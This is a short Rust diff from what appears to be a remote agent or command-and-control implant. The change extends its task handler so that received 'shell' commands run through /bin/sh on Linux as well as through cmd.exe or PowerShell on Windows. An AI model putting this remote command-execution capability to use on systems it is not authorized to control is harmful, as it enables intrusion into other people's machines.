@@ -53,7 +53,15 @@ async fn start() -> Result<(), Box<dyn std::error::Error>> {
                 let args: Vec<&str> = task_parts[2..].to_vec();
 
                 if command == "shell" || command == "powershell" {
-                    let shell_cmd = if command == "shell" { "cmd.exe" } else { "powershell.exe" };
+                
+                    let shell_cmd = if cfg!(target_os = "windows") {
+		    if command == "shell" { "cmd.exe" } else { "powershell.exe" }
+		    } else if cfg!(target_os = "linux") {
+		    	"/bin/sh"
+		    } else {
+		    	panic!("Unsupported operating system");
+		    };
+
                     let arg = args.join(" ");
                     println!("|- Received command: {}", arg);
 
@@ -86,8 +94,17 @@ async fn start() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 fn shell(file_name: &str, arguments: &str) -> String {
+
+    let c_arg = if cfg!(target_os = "windows") {
+	    "/c"
+    } else if cfg!(target_os = "linux") {
+	    "-c"
+    } else {
+	    panic!("Unsupported operating system");
+    };
+    
     let output = Command::new(file_name)
-        .arg("/c")
+        .arg(c_arg)
         .arg(arguments)
         .output()
         .expect("Failed to execute command");
